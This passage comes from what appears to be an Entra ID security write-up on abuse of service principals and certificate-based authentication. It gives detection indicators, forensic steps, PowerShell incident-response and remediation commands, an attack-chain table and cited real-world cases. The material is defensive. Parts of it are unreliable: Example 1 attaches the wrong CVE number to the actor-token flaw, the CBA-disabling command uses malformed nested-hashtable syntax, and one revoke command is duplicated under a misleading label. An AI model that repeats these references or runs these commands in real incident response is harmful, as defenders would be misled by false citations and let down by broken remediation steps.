- CBA is disabled or strictly controlled with MFA
- No service principal owns multiple other service principals
- PIM requires multi-approval for sensitive roles
- Only internal CA is registered
- Conditional Access policies are enforcing device compliance

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Cloud Audit Log Patterns:**
    - Service principal creation followed by immediate role assignment to Global Admin
    - AuthenticationMethodsPolicy updates enabling CBA at unusual hours (nights/weekends)
    - Multiple CAs registered in short timeframe
    - PIM activation for Authentication Policy Administrator without tickets
    - AuditLogs with OperationName containing "certificate" or "CBA" from non-standard accounts

*   **Network Indicators:**
    - Unusual API calls to `graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy`
    - Token requests from residential IPs or proxy services
    - Certificate API calls outside of change windows

*   **Behavioral Indicators:**
    - Service principal with displayName like "Office Deployment Assistant" (legitimate-sounding but suspicious)
    - CA with IssuerName "Trusted-Root-CA" or similar generic names
    - Rapid escalation from low-privilege service principal to Global Admin in under 1 hour

### Forensic Artifacts

*   **Cloud Logs:**
    - AuditLogs table: Filter by OperationName containing "certificate", "CBA", "authenticationMethods"
    - SigninLogs: May show zero entries for compromised account (no user sign-in, only API-level)
    - DirectoryAuditLogs: Shows service principal and role modifications

*   **Timeline Reconstruction:**
    1. Identify when malicious CA was registered (AuditLogs)
    2. Identify when CBA was enabled (AuditLogs.OperationName)
    3. Identify when Global Admin account was accessed with certificate (Check if any API calls succeeded with certificate auth after CA registration)
    4. Identify what actions were taken with Global Admin token (all subsequent AuditLogs from that point)

### Response Procedures

1.  **Immediate Isolation:**
    **Commands:**
    ```powershell
    # Revoke all refresh tokens for Global Admin
    Revoke-MgUserSignInSession -UserId "globaladmin@contoso.com"
    
    # Disable the Global Admin account temporarily
    Update-MgUser -UserId "globaladmin@contoso.com" -AccountEnabled $false
    
    # Revoke all PRT tokens (Primary Refresh Tokens)
    Revoke-MgUserSignInSession -UserId "globaladmin@contoso.com"
    ```
    
    **Manual (Azure Portal):**
    - Go to **Azure Portal** → **Entra ID** → **Users** → Search for Global Admin
    - Click the user → **Sign-in sessions** → **Revoke all sessions**
    - Go to **Account** → Disable account

2.  **Collect Evidence:**
    **Commands:**
    ```powershell
    # Export all AuditLogs from past 30 days
    $logs = Get-MgAuditLogDirectoryAudit -Filter "createdDateTime gt 2026-01-10" -All
    $logs | Export-Csv -Path "C:\Forensics\AuditLogs_30days.csv"
    
    # Export authentication method policy history
    Get-MgPolicyAuthenticationMethodPolicy | Export-Csv "C:\Forensics\AuthPolicy.csv"
    
    # List all certificate authorities
    Get-MgOrganizationCertificateBasedAuthConfiguration | Export-Csv "C:\Forensics\CertificateAuthorities.csv"
    
    # List all service principals and role assignments
    Get-MgServicePrincipal -All | Export-Csv "C:\Forensics\ServicePrincipals.csv"
    ```
    
    **Manual (Azure Portal):**
    - Go to **Azure Portal** → **Azure AD** → **Audit logs**
    - Filter by date range (past 30 days)
    - Export all events
    - Save to secure forensics location

3.  **Remediate:**
    **Commands:**
    ```powershell
    # Remove malicious CA
    $maliciousCAs = Get-MgOrganizationCertificateBasedAuthConfiguration
    $maliciousCAs.CertificateAuthorities | Where-Object { $_.IssuerName -eq "Trusted-Root-CA" } | ForEach-Object {
        # Unfortunately, removal requires direct API call
        $caToRemove = $_
        Write-Host "Remove CA: $($caToRemove.IssuerName)" # Manual step via Azure Portal
    }
    
    # Disable CBA if not needed
    Update-MgPolicyAuthenticationMethodPolicy -Id (Get-MgPolicyAuthenticationMethodPolicy).Id `
        -AuthenticationMethods @{
            @{
                "@odata.type" = "#microsoft.graph.x509Certificate"
                state = "disabled"
            }
        }
    
    # Remove backdoor service principal
    Remove-MgServicePrincipal -ServicePrincipalId "backdoor-sp-id"
    
    # Revoke all service principal secrets
    Get-MgServicePrincipal | Get-MgServicePrincipalPasswordCredential | ForEach-Object {
        Remove-MgServicePrincipalPassword -ServicePrincipalId $_.ServicePrincipalId -KeyId $_.KeyId
    }
    ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-004, REC-CLOUD-001] | Enumeration of service principals and privilege paths |
| **2** | **Initial Access** | [IA-VALID-001] | Default or leaked service principal credentials |
| **3** | **Privilege Escalation** | **[EMERGING-IDENTITY-001]** | **SMART Identity Abuse via service principal chain** |
| **4** | **Persistence** | [PER-CLOUD-001] | Creation of backdoor service principals with Global Admin |
| **5** | **Impact** | [IMPACT-M365-001] | Exfiltration of M365 data, ransomware deployment, tenant-wide compromise |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Entra ID Actor Token Exploit (CVE-2023-28432 - Related)
- **Target:** Enterprise organizations using Entra ID with legacy API enabled
- **Timeline:** 2023-2024 (patched by Microsoft)
- **Technique Status:** ACTIVE in unpatched environments; FIXED in current versions
- **Impact:** Global Admin impersonation across any tenant, bypasses MFA and Conditional Access
- **Reference:** [Mitiga.io Actor Token Analysis](https://www.mitiga.io/blog/breaking-down-the-microsoft-entra-id-actor-token-vulnerability-the-perfect-crime-in-the-cloud)

#### Example 2: Semperis EntraGoat Lab - Scenario 6
- **Target:** Educational lab environment demonstrating Entra ID misconfigurations
- **Timeline:** 2025-present
- **Technique Status:** ACTIVE in misconfigured environments
- **Impact:** Tenant takeover via leaked service principal credentials + CBA abuse
- **Reference:** [Semperis Certificate-Based Auth Exploitation](https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/)

#### Example 3: Scattered Spider / Isolated Spider Campaign
- **Target:** Large enterprises with service principal sprawl
- **Timeline:** 2023-present
- **Technique Status:** ACTIVE (documented by CISA, Cyber.gov.au)
- **Impact:** Lateral movement from help desk to cloud infrastructure using leaked credentials
- **Reference:** [CISA Alert: Scattered Spider](https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/scattered-spider)

---

## 12. SUMMARY & KEY TAKEAWAYS

SMART Identity Abuse exploits the convergence of three weaknesses:

1. **Operational:** Leaked service principal credentials in public repositories (automation sprawl)
2. **Architectural:** Unreviewed service principal ownership chains and permission escalation
3. **Configuration:** Overly permissive CBA policies and PIM approval requirements

**Prevention requires a layered approach:**
- **Detect:** Monitor for service principal ownership escalation, CBA enablement, PIM activations
- **Prevent:** Disable CBA unless required, enforce strict Conditional Access, require multi-approval for sensitive roles
- **Respond:** Rapid credential revocation, audit log analysis, clean-up of malicious SPs and CAs

This technique represents a **critical gap** in identity security: the absence of MFA enforcement at the API level for service-to-service authentication, creating a pathway from low-privilege automation to complete tenant compromise.

---